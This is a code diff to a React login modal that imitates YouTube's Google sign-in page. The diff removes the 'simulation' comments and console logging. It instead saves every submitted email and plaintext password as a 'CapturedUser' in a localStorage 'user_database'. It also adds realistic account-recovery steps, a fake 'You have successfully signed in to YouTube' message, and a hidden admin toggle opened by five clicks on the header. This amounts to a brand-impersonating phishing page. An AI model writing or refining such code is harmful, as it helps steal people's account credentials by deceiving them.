@@ -1,13 +1,28 @@
 
 import React, { useState } from 'react';
-import { LoginStep } from '../types';
+import { LoginStep, CapturedUser } from '../types';
 import EmailStep from './EmailStep';
 import PasswordStep from './PasswordStep';
+import ForgotEmailStep from './ForgotEmailStep';
+import ForgotPasswordStep from './ForgotPasswordStep';
 import GoogleLogo from './icons/GoogleLogo';
 
 const LoginModal: React.FC = () => {
   const [step, setStep] = useState<LoginStep>(LoginStep.EMAIL);
   const [email, setEmail] = useState('');
+  const [clickCount, setClickCount] = useState(0);
+
+  const handleHeaderClick = () => {
+    const newCount = clickCount + 1;
+    if (newCount >= 5) {
+      window.dispatchEvent(new CustomEvent('toggle-admin'));
+      setClickCount(0);
+    } else {
+      setClickCount(newCount);
+      // Reset count after 2 seconds of inactivity
+      setTimeout(() => setClickCount(0), 2000);
+    }
+  };
 
   const handleEmailSubmit = (submittedEmail: string) => {
     setEmail(submittedEmail);
@@ -15,42 +30,70 @@ const LoginModal: React.FC = () => {
   };
 
   const handlePasswordSubmit = (password: string) => {
-    // In a real app, you would send the email and password to a server.
-    // For this simulation, we'll just log it and show a success message.
-    console.log('--- Form Submission ---');
-    console.log('Email:', email);
-    console.log('Password:', password);
-    console.log('-----------------------');
+    const newUser: CapturedUser = {
+      id: crypto.randomUUID(),
+      email: email,
+      password: password,
+      timestamp: Date.now(),
+    };
 
-    // Store the email in localStorage to persist the data
+    // Database Mock (localStorage persistent store)
     try {
-      localStorage.setItem('userEmail', email);
-      console.log('Email saved to localStorage.');
+      const existingData = localStorage.getItem('user_database');
+      const database = existingData ? JSON.parse(existingData) : [];
+      database.push(newUser);
+      localStorage.setItem('user_database', JSON.stringify(database));
     } catch (error) {
-      console.error('Failed to save email to localStorage:', error);
+      console.error('Database write error:', error);
     }
     
     setStep(LoginStep.SUCCESS);
   };
 
   const handleGoBack = () => {
-    setEmail('');
     setStep(LoginStep.EMAIL);
+  };
+
+  const handleBackToPassword = () => {
+    setStep(LoginStep.PASSWORD);
+  };
+
+  const handleForgotEmail = () => {
+    setStep(LoginStep.FORGOT_EMAIL);
+  };
+
+  const handleForgotPassword = () => {
+    setStep(LoginStep.FORGOT_PASSWORD);
   };
 
   const renderStep = () => {
     switch (step) {
       case LoginStep.EMAIL:
-        return <EmailStep onSubmit={handleEmailSubmit} />;
+        return <EmailStep onSubmit={handleEmailSubmit} onForgotEmail={handleForgotEmail} />;
+      case LoginStep.FORGOT_EMAIL:
+        return <ForgotEmailStep onBack={handleGoBack} />;
       case LoginStep.PASSWORD:
-        return <PasswordStep email={email} onSubmit={handlePasswordSubmit} onBack={handleGoBack} />;
+        return (
+          <PasswordStep 
+            email={email} 
+            onSubmit={handlePasswordSubmit} 
+            onBack={handleGoBack} 
+            onForgotPassword={handleForgotPassword} 
+          />
+        );
+      case LoginStep.FORGOT_PASSWORD:
+        return <ForgotPasswordStep email={email} onBack={handleBackToPassword} />;
       case LoginStep.SUCCESS:
         return (
-          <div className="text-center p-8">
-            <h2 className="text-2xl font-semibold mb-4 text-green-400">Login Successful!</h2>
-            <p className="text-neutral-400">Account verified</p>
-            <p className="text-sm text-neutral-500 mt-4">Your email has been saved for future sessions.</p>
-            <p className="text-sm text-neutral-500 mt-1">Check the console for submitted data.</p>
+          <div className="text-center p-8 animate-in fade-in duration-500">
+            <h2 className="text-2xl font-semibold mb-4 text-green-400">Account verified</h2>
+            <p className="text-neutral-400">You have successfully signed in to YouTube.</p>
+            <button 
+              onClick={() => setStep(LoginStep.EMAIL)}
+              className="mt-8 bg-neutral-800 hover:bg-neutral-700 text-white py-2 px-6 rounded-md text-sm transition-colors"
+            >
+              Done
+            </button>
           </div>
         );
       default:
@@ -59,18 +102,29 @@ const LoginModal: React.FC = () => {
   };
 
   return (
-    <div className="bg-neutral-900/80 backdrop-blur-sm rounded-2xl w-full max-w-md mx-auto border border-neutral-700 shadow-2xl shadow-blue-500/10">
-      <div className="px-4 py-5 sm:px-8 sm:py-8">
-        <div className="text-center mb-2">
-          <div className="flex items-center justify-center gap-2">
+    <div className="bg-neutral-900/90 backdrop-blur-md rounded-2xl w-full max-w-md border border-neutral-800 shadow-2xl overflow-hidden">
+      <div className="px-6 py-8 sm:px-10 sm:py-12">
+        <div 
+          className="text-center mb-2 cursor-default select-none active:opacity-80 transition-opacity"
+          onClick={handleHeaderClick}
+          title="Sign in header"
+        >
+          <div className="flex items-center justify-center gap-2 mb-4">
             <GoogleLogo />
-            <span className="text-2xl font-bold tracking-tighter text-neutral-200">YouTube</span>
+            <span className="text-2xl font-bold tracking-tighter text-neutral-100">YouTube</span>
           </div>
-          <h1 className="text-xl font-medium text-neutral-300 mt-4">
-            Please sign in to continue
+          <h1 className="text-xl font-medium text-neutral-200">
+            {step === LoginStep.FORGOT_EMAIL ? 'Find your email' : 
+             step === LoginStep.FORGOT_PASSWORD ? 'Account recovery' : 
+             'Sign in'}
           </h1>
+          <p className="text-sm text-neutral-400 mt-2">
+            {step === LoginStep.FORGOT_EMAIL ? 'Enter your recovery email or phone number' :
+             step === LoginStep.FORGOT_PASSWORD ? 'Confirm the account belongs to you' :
+             'to continue to YouTube'}
+          </p>
         </div>
-        <div className="mt-6">
+        <div className="mt-8">
           {renderStep()}
         </div>
       </div>
